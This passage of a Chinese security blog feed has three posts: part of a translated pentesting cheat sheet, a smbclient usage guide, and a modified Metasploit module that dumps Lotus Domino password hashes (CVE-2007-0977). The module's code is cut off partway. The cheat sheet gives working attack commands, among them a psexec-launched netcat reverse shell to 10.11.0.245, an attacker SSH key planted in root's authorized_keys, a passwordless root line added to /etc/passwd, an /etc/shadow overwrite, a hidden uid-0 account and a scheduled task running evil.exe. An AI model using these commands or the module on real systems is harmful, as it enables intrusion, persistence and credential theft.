/user:userName cmd.exe</span><br></pre></td></tr></table></figure><h4 id="PsExec"><a href="#PsExec" class="headerlink" title="PsExec"></a>PsExec</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec -accepteula -u user -p password cmd /c c:\temp\nc.exe 10.11.0.245 80 -e cmd.exe</span><br></pre></td></tr></table></figure><h4 id="Pth-WinExe"><a href="#Pth-WinExe" class="headerlink" title="Pth-WinExe"></a>Pth-WinExe</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pth-winexe -U user%pass --runas=user%pass //10.1.1.1 cmd.exe</span><br></pre></td></tr></table></figure><h3 id="发现隐藏文件"><a href="#发现隐藏文件" class="headerlink" title="发现隐藏文件"></a>发现隐藏文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir /A:H /s &quot;c:\program files&quot;</span><br></pre></td></tr></table></figure><h3 id="常规的文件搜索操作"><a href="#常规的文件搜索操作" class="headerlink" title="常规的文件搜索操作"></a>常规的文件搜索操作</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Query the local db for a quick file find. Run updatedb before executing locate.  //数据库查找文件</span><br><span class="line">locate passwd </span><br><span class="line"></span><br><span class="line"># Show which file would be executed in the current environment, depending on $PATH environment variable;</span><br><span class="line">which nc wget curl php perl python netcat tftp telnet ftp</span><br><span class="line"></span><br><span class="line"># Search for *.conf (case-insensitive) files recursively starting with /etc;</span><br><span class="line">find /etc -iname *.conf</span><br></pre></td></tr></table></figure><h2 id="维持访问"><a href="#维持访问" class="headerlink" title="维持访问"></a>维持访问</h2><h3 id="注册表配置单元"><a href="#注册表配置单元" class="headerlink" title="注册表配置单元"></a>注册表配置单元</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hivesh /registry/file</span><br></pre></td></tr></table></figure><p><a href="http://libguestfs.org/hivexsh.1.html" target="_blank" rel="noopener">hivexsh - Windows注册表配置单元shell</a></p><h3 id="解密VNC的密码"><a href="#解密VNC的密码" class="headerlink" title="解密VNC的密码"></a>解密VNC的密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wine vncpwdump.exe -k key</span><br></pre></td></tr></table></figure><h3 id="创建用户并添加到管理员组"><a href="#创建用户并添加到管理员组" class="headerlink" title="创建用户并添加到管理员组"></a>创建用户并添加到管理员组</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user spotless spotless /add &amp; net localgroup Administrators spotless /add</span><br></pre></td></tr></table></figure><p>tips：在无回显的时候，添加失败可能是因为你的密码强度不符合密码策略</p><h3 id="SSH-keys"><a href="#SSH-keys" class="headerlink" title="SSH keys"></a>SSH keys</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /root/.ssh 2&gt;/dev/null; echo &apos;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQChKCUsFVWj1Nz8SiM01Zw/BOWcMNs2Zwz3MdT7leLU9/Un4mZ7vjco0ctsyh2swjphWr5WZG28BN90+tkyj3su23UzrlgEu3SaOjVgxhkx/Pnbvuua9Qs9gWbWyRxexaC1eDb0pKXHH2Msx+GlyjfDOngq8tR6tkU8u1S4lXKLejaptiz0q6P0CcR6hD42IYkqyuWTNrFdSGLtiPCBDZMZ/5g1cJsyR59n54IpV0b2muE3F7+NPQmLx57IxoPjYPNUbC6RPh/Saf7o/552iOcmVCdLQDR/9I+jdZIgrOpstqSiJooU9+JImlUtAkFxZ9SHvtRbFt47iH7Sh7LiefP5 root@kali&apos; &gt;&gt; /root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><h3 id="创建后门"><a href="#创建后门" class="headerlink" title="创建后门"></a>创建后门</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;spotless::0:0:root:/root:/bin/bash&apos; &gt;&gt; /etc/passwd</span><br><span class="line"></span><br><span class="line"># Rarely needed, but if you need to add a password to the previously created user by using useradd and passwd is not working. Pwd is &quot;kali&quot;</span><br><span class="line">sed &apos;s/!/\$6$o1\.HFMVM$a3hY6OPT\/DiQYy4koI6Z3\/sLiltsOcFoS5yCKhBBqQLH5K1QlHKL8\/6wJI6uF\/Q7mniOdq92v6yjzlVlXlxkT\./&apos; /etc/shadow &gt; /etc/s2; cat /etc/s2 &gt; /etc/shadow; rm /etc/s2</span><br></pre></td></tr></table></figure><h3 id="创建另一个root用户"><a href="#创建另一个root用户" class="headerlink" title="创建另一个root用户"></a>创建另一个root用户</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd -u0 -g0 -o -s /bin/bash -p `openssl passwd yourpass` rootuser</span><br></pre></td></tr></table></figure><h3 id="OpenSSL-Password"><a href="#OpenSSL-Password" class="headerlink" title="OpenSSL Password"></a>OpenSSL Password</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 password </span><br><span class="line"># output $1$YKbEkrkZ$7Iy/M3exliD/yJfJVeTn5.</span><br></pre></td></tr></table></figure><h3 id="计划任务后门"><a href="#计划任务后门" class="headerlink" title="计划任务后门"></a>计划任务后门</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Launch evil.exe every 10 minutes</span><br><span class="line">schtasks /create /sc minute /mo 10 /tn &quot;TaskName&quot; /tr C:\Windows\system32\evil.exe</span><br></pre></td></tr></table></figure><p>参考链接：</p><p>原文链接：<a href="https://ired.team/offensive-security-experiments/offensive-security-cheetsheets#bypassing-file-upload-restrictions" target="_blank" rel="noopener">https://ired.team/offensive-security-experiments/offensive-security-cheetsheets#bypassing-file-upload-restrictions</a></p><p>中文链接：<a href="https://xz.aliyun.com/t/4555#toc-114" target="_blank" rel="noopener">https://xz.aliyun.com/t/4555#toc-114</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote&gt;&lt;br&gt;  在先知上看见wing发的Pentesting备忘录，发现了好多比较好的命令和在实战中比较有用的命令，在看完后自己结合原版和中文版添加了一些拓展，让自己在回看的时候快速的回顾内容。同时发现原文的其他内容比较不错，后续也会跟随翻译一点。&lt;br&gt;&lt;/blockquote&gt;&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="信息收集" scheme="https://www.marksec.org/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>test</title>
    <link href="https://www.marksec.org/2019/04/20/test/"/>
    <id>https://www.marksec.org/2019/04/20/test/</id>
    <published>2019-04-20T12:01:58.000Z</published>
    <updated>2019-04-20T12:01:58.843Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>内网渗透之smbclient工具学习</title>
    <link href="https://www.marksec.org/2019/04/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bsmbclient%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/"/>
    <id>https://www.marksec.org/2019/04/10/内网渗透之smbclient工具学习/</id>
    <published>2019-04-10T10:13:00.000Z</published>
    <updated>2019-04-10T14:00:15.749Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>  最近在渗透中通过代理带入工具发现使用代理反弹rdesktop进行文件查看太过于麻烦，利用metasploit等回连反弹shell也不是特别方便，最近发现使用smbclient进行代理进入内网，通过smb进行磁盘挂载查看，在速度和隐蔽性上都比较的不错。<br></blockquote><p><strong>smbclient命令</strong>属于samba套件，它提供一种命令行使用交互式方式访问samba服务器的共享资源。</p><a id="more"></a><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient(选项)(参数)</span><br></pre></td></tr></table></figure><h3 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">-B&lt;ip地址&gt;：传送广播数据包时所用的IP地址；</span><br><span class="line">-d&lt;排错层级&gt;：指定记录文件所记载事件的详细程度；</span><br><span class="line">-E：将信息送到标准错误输出设备；</span><br><span class="line">-h：显示帮助；</span><br><span class="line">-i&lt;范围&gt;：设置NetBIOS名称范围；</span><br><span class="line">-I&lt;IP地址&gt;：指定服务器的IP地址；</span><br><span class="line">-l&lt;记录文件&gt;：指定记录文件的名称；</span><br><span class="line">-L：显示服务器端所分享出来的所有资源；</span><br><span class="line">-M&lt;NetBIOS名称&gt;：可利用WinPopup协议，将信息送给选项中所指定的主机；</span><br><span class="line">-n&lt;NetBIOS名称&gt;：指定用户端所要使用的NetBIOS名称；</span><br><span class="line">-N：不用询问密码；</span><br><span class="line">-O&lt;连接槽选项&gt;：设置用户端TCP连接槽的选项；</span><br><span class="line">-p&lt;TCP连接端口&gt;：指定服务器端TCP连接端口编号；</span><br><span class="line">-R&lt;名称解析顺序&gt;：设置NetBIOS名称解析的顺序；</span><br><span class="line">-s&lt;目录&gt;：指定smb.conf所在的目录；</span><br><span class="line">-t&lt;服务器字码&gt;：设置用何种字符码来解析服务器端的文件名称；</span><br><span class="line">-T&lt;tar选项&gt;：备份服务器端分享的全部文件，并打包成tar格式的文件；</span><br><span class="line">-U&lt;用户名称&gt;：指定用户名称；</span><br><span class="line">-w&lt;工作群组&gt;：指定工作群组名称。</span><br><span class="line">-C：直接一次性使用smbclient命令</span><br></pre></td></tr></table></figure><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">列出某个IP地址所提供的共享文件夹</span><br><span class="line">smbclient -L 198.168.0.1 -U username%password</span><br><span class="line"></span><br><span class="line">像ftp客户端一样使用smbclient</span><br><span class="line">smbclient //192.168.0.1/tmp  -U username%password</span><br><span class="line">执行smbclient命令成功后，进入smbclient环境，出现提示符：smb:/&gt;</span><br><span class="line"></span><br><span class="line">直接一次性使用smbclient命令</span><br><span class="line">smbclient -c &quot;ls&quot;  //192.168.0.1/tmp  -U username%password</span><br><span class="line"></span><br><span class="line">注意：在进行smb:/&gt;之后想上传下载文件不能使用绝对路径，相对路径即可</span><br></pre></td></tr></table></figure><h3 id="远程挂载"><a href="#远程挂载" class="headerlink" title="远程挂载"></a>远程挂载</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用mount命令可以将目标主机的目录挂在到linux的指定目录下进行操作，此处需要注意权限问题</span><br><span class="line">sudo mount -t cifs -o username=username,file_mode=0777,dir_mode=0777 //192.168.0.1/temp</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;  最近在渗透中通过代理带入工具发现使用代理反弹rdesktop进行文件查看太过于麻烦，利用metasploit等回连反弹shell也不是特别方便，最近发现使用smbclient进行代理进入内网，通过smb进行磁盘挂载查看，在速度和隐蔽性上都比较的不错。&lt;br&gt;&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;smbclient命令&lt;/strong&gt;属于samba套件，它提供一种命令行使用交互式方式访问samba服务器的共享资源。&lt;/p&gt;
    
    </summary>
    
    
      <category term="内网渗透" scheme="https://www.marksec.org/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>关于metasploit模块lotus版本大于9.0的修改</title>
    <link href="https://www.marksec.org/2019/04/04/lotus%E6%A8%A1%E5%9D%97%E4%BF%AE%E6%94%B9/"/>
    <id>https://www.marksec.org/2019/04/04/lotus模块修改/</id>
    <published>2019-04-04T08:13:00.000Z</published>
    <updated>2019-04-10T13:36:47.098Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote><br>  最近在工作中遇到了lotus的邮件系统，但在对于lotus的研究中发现，在使用metastploit的auxiliary/scanner/lotus/lotus_domino_hashes的时候，出现了报错，在显示了第一行的用户名和密码后，就直接报错了，在查询资料了解到lotus&gt;=9.0，登陆功能发生了变化，无法使用。<br></blockquote><br><a id="more"></a><br>metasploit的中的lotus用户名密码导出模块auxiliary/scanner/lotus/lotus_domino_hashes的两处修改：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">第一处：       </span><br><span class="line">       res = send_request_raw(&#123;</span><br><span class="line">          &apos;method&apos;  =&gt; &apos;GET&apos;,</span><br><span class="line">         &apos;uri&apos;     =&gt; &quot;#&#123;$uri&#125;\/$defaultview?Readviewentries&quot;,</span><br><span class="line">第二处：</span><br><span class="line">          :source_id =&gt; domino_svc.id,</span><br></pre></td></tr></table></figure><p>修改成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">第一处：        </span><br><span class="line">        res = send_request_cgi(&#123;</span><br><span class="line">          &apos;uri&apos;     =&gt; &apos;/names.nsf/$defaultview?Readviewentries&apos;,</span><br><span class="line">第二处：</span><br><span class="line">           #:source_id =&gt; domino_svc.id,</span><br></pre></td></tr></table></figure><p>修改完的完整rb脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line">##</span><br><span class="line"># This module requires Metasploit: https://metasploit.com/download</span><br><span class="line"># Current source: https://github.com/rapid7/metasploit-framework</span><br><span class="line">##</span><br><span class="line"></span><br><span class="line">class MetasploitModule &lt; Msf::Auxiliary</span><br><span class="line">  include Msf::Exploit::Remote::HttpClient</span><br><span class="line">  include Msf::Auxiliary::Report</span><br><span class="line">  include Msf::Auxiliary::Scanner</span><br><span class="line"></span><br><span class="line">  def initialize</span><br><span class="line">    super(</span><br><span class="line">      &apos;Name&apos;           =&gt; &apos;Lotus Domino Password Hash Collector&apos;,</span><br><span class="line">      &apos;Description&apos;    =&gt; &apos;Get users passwords hashes from names.nsf page&apos;,</span><br><span class="line">      &apos;Author&apos;         =&gt; &apos;Tiago Ferreira &lt;tiago.ccna[at]gmail.com&gt;&apos;,</span><br><span class="line">      &apos;License&apos;        =&gt; MSF_LICENSE,</span><br><span class="line">      &apos;References&apos;     =&gt;</span><br><span class="line">        [</span><br><span class="line">          [&apos;CVE&apos; , &apos;2007-0977&apos;]</span><br><span class="line">        ]</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">  register_options(</span><br><span class="line">    [</span><br><span class="line">      OptString.new(&apos;NOTES_USER&apos;, [false, &apos;The username to authenticate as&apos;, &apos;&apos;]),</span><br><span class="line">      OptString.new(&apos;NOTES_PASS&apos;, [false, &apos;The password for the specified username&apos; ]),</span><br><span class="line">      OptString.new(&apos;URI&apos;, [false, &apos;Define the path to the names.nsf file&apos;, &apos;/names.nsf&apos;])</span><br><span class="line">    ])</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  def post_auth?</span><br><span class="line">    true</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  def run_host(ip)</span><br><span class="line">    user = datastore[&apos;NOTES_USER&apos;]</span><br><span class="line">    pass = datastore[&apos;NOTES_PASS&apos;]</span><br><span class="line">    @uri = normalize_uri(datastore[&apos;URI&apos;])</span><br><span class="line"></span><br><span class="line">    if user.eql?(&apos;&apos;) &amp;&amp; pass.eql?(&apos;&apos;)</span><br><span class="line">      print_status(&quot;#&#123;peer&#125; - Lotus Domino - Trying dump password hashes without credentials&quot;)</span><br><span class="line"></span><br><span class="line">      begin</span><br><span class="line">        res = send_request_raw(&#123;</span><br><span class="line">          &apos;method&apos;  =&gt; &apos;GET&apos;,</span><br><span class="line">          &apos;uri&apos;     =&gt; &quot;#&#123;@uri&#125;\/$defaultview?Readviewentries&quot;,</span><br><span class="line">        &#125;, 25)</span><br><span class="line"></span><br><span class="line">        if res.nil?</span><br><span class="line">          print_error(&apos;Connection failed&apos;)</span><br><span class="line">          return</span><br><span class="line">        end</span><br><span class="line"></span><br><span class="line">        if res &amp;&amp; res.body.to_s =~ /\&lt;viewentries/</span><br><span class="line">          print_good(&quot;#&#123;peer&#125; - Lotus Domino - OK names.nsf accessible without credentials&quot;)</span><br><span class="line">          cookie = &apos;&apos;</span><br><span class="line">          get_views(cookie, @uri)</span><br><span class="line"></span><br><span class="line">        elsif res &amp;&amp; res.body.to_s =~ /names.nsf\?Login/</span><br><span class="line">          print_error(&quot;#&#123;peer&#125; - Lotus Domino - The remote server requires authentication&quot;)</span><br><span class="line">          return :abort</span><br><span class="line"></span><br><span class="line">        else</span><br><span class="line">          print_error(&quot;#&#123;peer&#125; - Lotus Domino - Unrecognized #&#123;res.code&#125; response&quot;)</span><br><span class="line">          vprint_error(res.to_s)</span><br><span class="line">          return :abort</span><br><span class="line"></span><br><span class="line">        end</span><br><span class="line"></span><br><span class="line">      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout</span><br><span class="line">      rescue ::Timeout::Error, ::Errno::EPIPE</span><br><span class="line">      end</span><br><span class="line"></span><br><span class="line">    else</span><br><span class="line">      print_status(&quot;#&#123;peer&#125; - Lotus Domino - Trying dump password hashes with given credentials&quot;)</span><br><span class="line">      do_login(user, pass)</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  def do_login(user = nil, pass = nil)</span><br><span class="line">    post_data = &quot;username=#&#123;Rex::Text.uri_encode(user.to_s)&#125;&amp;password=#&#123;Rex::Text.uri_encode(pass.to_s)&#125;&amp;RedirectTo=%2Fnames.nsf&quot;</span><br><span class="line"></span><br><span class="line">    begin</span><br><span class="line"></span><br><span class="line">      res = send_request_cgi(&#123;</span><br><span class="line">        &apos;method&apos;  =&gt; &apos;POST&apos;,</span><br><span class="line">        &apos;uri&apos;     =&gt; &apos;/names.nsf?Login&apos;,</span><br><span class="line">        &apos;data&apos;    =&gt; post_data</span><br><span class="line">      &#125;, 20)</span><br><span class="line"></span><br><span class="line">      if res.nil?</span><br><span class="line">        print_error(&quot;#&#123;peer&#125; - Connection timed out&quot;)</span><br><span class="line">        return</span><br><span class="line">      end</span><br><span class="line"></span><br><span class="line">      if res &amp;&amp; res.code == 302</span><br><span class="line">        if res.get_cookies =~ /DomAuthSessId=(.*);(.*)/i</span><br><span class="line">          cookie = &quot;DomAuthSessId=#&#123;$1&#125;&quot;</span><br><span class="line">        elsif res.get_cookies =~ /LtpaToken=(.*);(.*)/i</span><br><span class="line">          cookie = &quot;LtpaToken=#&#123;$1&#125;&quot;</span><br><span class="line">        else</span><br><span class="line">          print_error(&quot;#&#123;peer&#125; - Lotus Domino - Unrecognized 302 response&quot;)</span><br><span class="line">          return :abort</span><br><span class="line">        end</span><br><span class="line">        print_good(&quot;#&#123;peer&#125; - Lotus Domino - SUCCESSFUL authentication for &apos;#&#123;user&#125;&apos;&quot;)</span><br><span class="line">        print_status(&quot;#&#123;peer&#125; - Lotus Domino - Getting password hashes&quot;)</span><br><span class="line">        get_views(cookie, @uri)</span><br><span class="line"></span><br><span class="line">      elsif res &amp;&amp; res.body.to_s =~ /names.nsf\?Login/</span><br><span class="line">        print_error(&quot;#&#123;peer&#125; - Lotus Domino - Authentication error: failed to login as &apos;#&#123;user&#125;&apos;&quot;)</span><br><span class="line">        return :abort</span><br><span class="line"></span><br><span class="line">      else</span><br><span class="line">        print_error(&quot;#&#123;peer&#125; - Lotus Domino - Unrecognized #&#123;res.code&#125; response&quot;)</span><br><span class="line">        return :abort</span><br><span class="line">      end</span><br><span class="line"></span><br><span class="line">    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout</span><br><span class="line">    rescue ::Timeout::Error, ::Errno::EPIPE</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  def get_views(cookie, uri)</span><br><span class="line">    begin</span><br><span class="line">      res = send_request_raw(&#123;</span><br><span class="line">        &apos;method&apos;  =&gt; &apos;GET&apos;,</span><br><span class="line">        &apos;uri&apos;     =&gt; &quot;#&#123;uri&#125;\/$defaultview?Readviewentries&quot;,</span><br><span class="line">        &apos;cookie&apos;  =&gt; cookie</span><br><span class="line">      &#125;, 25)</span><br><span class="line">      if res &amp;&amp; res.body</span><br><span class="line">        max = res.body.scan(/siblings=\&quot;(.*)\&quot;/).first.join</span><br><span class="line"></span><br><span class="line">        1.upto(max.to_i) do |i|</span><br><span class="line">          res = send_request_raw(&#123;</span><br><span class="line">            &apos;method&apos;  =&gt; &apos;GET&apos;,</span><br><span class="line">            &apos;uri&apos;     =&gt; &quot;#&#123;uri&#125;\/$defaultview?Readviewentries&amp;Start=#&#123;i&#125;&quot;,</span><br><span class="line">            &apos;cookie&apos;  =&gt; cookie</span><br><span class="line">          &#125;, 25)</span><br><span class="line"></span><br><span class="line">          view_id = res.body.scan(/unid=&quot;([^\s]+)&quot;/)[0].join</span><br><span class="line">          dump_hashes(view_id, cookie, uri)</span><br><span class="line">        end</span><br><span class="line"></span><br><span class="line">      end</span><br><span class="line"></span><br><span class="line">    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout</span><br><span class="line">    rescue ::Timeout::Error, ::Errno::EPIPE</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  def dump_hashes(view_id, cookie, uri)</span><br><span class="line">    begin</span><br><span class="line">      res = send_request_raw(&#123;</span><br><span class="line">        &apos;method&apos;  =&gt; &apos;GET&apos;,</span><br><span class="line">        &apos;uri&apos;     =&gt; &quot;#&#123;uri&#125;\/$defaultview/#&#123;view_id&#125;?OpenDocument&quot;,</span><br><span class="line">        &apos;cookie&apos;  =&gt; cookie</span><br><span class="line">      &#125;, 25)</span><br><span class="line"></span><br><span class="line">      if res &amp;&amp; res.body</span><br><span class="line">        short_name = res.body.scan(/&lt;INPUT NAME=\&quot;ShortName\&quot; TYPE=(?:.*) VALUE=\&quot;([^\s]+)&quot;/i).join</span><br><span class="line">        user_mail = res.body.scan(/&lt;INPUT NAME=\&quot;InternetAddress\&quot; TYPE=(?:.*) VALUE=\&quot;([^\s]+)&quot;/i).join</span><br><span class="line">        pass_hash = res.body.scan(/&lt;INPUT NAME=\&quot;\$?dspHTTPPassword\&quot; TYPE=(?:.*) VALUE=\&quot;([^\s]+)&quot;/i).join</span><br><span class="line"></span><br><span class="line">        short_name = &apos;NULL&apos; if short_name.to_s.strip.empty?</span><br><span class="line">        user_mail = &apos;NULL&apos; if user_mail.to_s.strip.empty?</span><br><span class="line">        pass_hash = &apos;NULL&apos; if pass_hash.to_s.strip.empty?</span><br><span class="line"></span><br><span class="line">        print_good(&quot;#&#123;peer&#125; - Lotus Domino - Account Found: #&#123;short_name&#125;, #&#123;user_mail&#125;, #&#123;pass_hash&#125;&quot;)</span><br><span class="line"></span><br><span class="line">        if pass_hash != &apos;NULL&apos;</span><br><span class="line">          domino_svc = report_service(</span><br><span class="line">            :host =&gt; rhost,</span><br><span class="line">            :port =&gt; rport,</span><br><span class="line">            :name =&gt; (ssl ? &apos;https&apos; : &apos;http&apos;)</span><br><span class="line">          )</span><br><span class="line">          report_auth_info(</span><br><span class="line">            :host        =&gt; rhost,</span><br><span class="line">            :port        =&gt; rport,</span><br><span class="line">            :sname       =&gt; (ssl ? &apos;https&apos; : &apos;http&apos;),</span><br><span class="line">            :user        =&gt; short_name,</span><br><span class="line">            :pass        =&gt; pass_hash,</span><br><span class="line">            :ptype       =&gt; &apos;domino_hash&apos;,</span><br><span class="line">            :source_id   =&gt; domino_svc.id,</span><br><span class="line">            :source_type =&gt; &apos;service&apos;,</span><br><span class="line">            :proof       =&gt; &quot;WEBAPP=\&quot;Lotus Domino\&quot;, USER_MAIL=#&#123;user_mail&#125;, HASH=#&#123;pass_hash&#125;, 